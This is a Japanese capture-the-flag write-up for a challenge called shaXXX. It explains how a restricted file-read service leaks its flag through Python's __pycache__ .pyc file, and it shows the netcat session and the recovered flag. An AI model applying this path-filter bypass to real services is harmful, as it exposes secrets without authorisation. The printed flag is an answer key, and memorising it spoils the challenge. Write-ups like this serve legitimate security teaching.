# shaXXX

## 問題の説明

このようなプログラムが実行されており、flagの値を取得できればフラグが得られます。

```py
import os
import sys
import shutil
import hashlib
from flag import flag


def initialization():
    if os.path.exists("./flags"):
        shutil.rmtree("./flags")
    os.mkdir("./flags")

    def write_hash(hash, bit):
        with open(f"./flags/sha{bit}.txt", "w") as f:
            f.write(hash)

    sha256 = hashlib.sha256(flag).hexdigest()
    write_hash(sha256, "256")

    sha384 = hashlib.sha384(flag).hexdigest()
    write_hash(sha384, "384")

    sha512 = hashlib.sha512(flag).hexdigest()
    write_hash(sha512, "512")


def get_full_path(file_path: str):
    full_path = os.path.join(os.getcwd(), file_path)
    return os.path.normpath(full_path)


def check1(file_path: str):
    program_root = os.getcwd()
    dirty_path = get_full_path(file_path)
    return dirty_path.startswith(program_root)


def check2(file_path: str):
    if os.path.basename(file_path) == "flag.py":
        return False
    return True


if __name__ == "__main__":
    initialization()
    print(sys.version)
    file_path = input("Input your salt file name(default=./flags/sha256.txt):")
    if file_path == "":
        file_path = "./flags/sha256.txt"
    if not check1(file_path) or not check2(file_path):
        print("No Hack!!! Your file path is not allowed.")
        exit()
    try:
        with open(file_path, "rb") as f:
            hash = f.read()
        print(f"{hash=}")
    except:
        print("No Hack!!!")
```

このプログラムでは任意のファイルの内容を表示することができます。たとえば、フラグのハッシュ化値が記載されている./flags/sha256.txtなどを表示することができます。

しかし、任意のファイルの値を表示することはできず、2つの関数によって制限されています。

```py
def get_full_path(file_path: str):
    full_path = os.path.join(os.getcwd(), file_path)
    return os.path.normpath(full_path)


def check1(file_path: str):
    program_root = os.getcwd()
    dirty_path = get_full_path(file_path)
    return dirty_path.startswith(program_root)


def check2(file_path: str):
    if os.path.basename(file_path) == "flag.py":
        return False
    return True
```

check1では現在のディレクトリより上の階層のファイルの読み取りを制限しています。ディレクトリトラバーサルの対策です(が、本問においては対策するメリットがあまりありません)。

check2では、ファイル名がflag.pyであるファイルの読み取りを制限しています。

## 解法

main.pyはflag.pyを読み込んでいますが、Pythonはその際に読み込み速度の向上などを目的として、`__pycache__`というキャッシュファイルを作成します。

flag.pyのキャッシュファイル名は`__pycache__/flag.cpython-{ここにPythonのバージョン}.pyc`という形式になっています。また、幸いにも問題の`print(sys.version)`の箇所でPythonのバージョンは判明しています。たとえば、Python 3.11.3を使用している場合、ファイル名は`__pycache__/flag.cpython-311.pyc`となります。なお、このファイル名はcheck1, check2のどちらの制限にも引っかかりません。

このようにして得られるキャッシュファイルの中身はこのようになっています。当然、キャッシュファイルなのでフラグが記載されています。

```txt
\xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00
```

よって、以下のようにしてフラグを得ることができます。

```sh
$ nc localhost 25612
3.11.3 (main, May 10 2023, 12:26:31) [GCC 12.2.1 20220924]
Input your salt file name(default=./flags/sha256.txt):__pycache__/flag.cpython-311.pyc
hash=b'\xa7\r\r\n\x00\x00\x00\x00\n\x12ud<\x00\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xf3\n\x00\x00\x00\x97\x00d\x00Z\x00d\x01S\x00)\x02s\x1b\x00\x00\x00ctf4b{c4ch3_15_0ur_fr13nd!}N)\x01\xda\x04flag\xa9\x00\xf3\x00\x00\x00\x00\xfa\x18/home/ctf/shaXXX/flag.py\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s\x0e\x00\x00\x00\xf0\x03\x01\x01\x01\xe0\x07%\x80\x04\x80\x04\x80\x04r\x04\x00\x00\x00'
```

flag: `ctf4b{c4ch3_15_0ur_fr13nd!}`
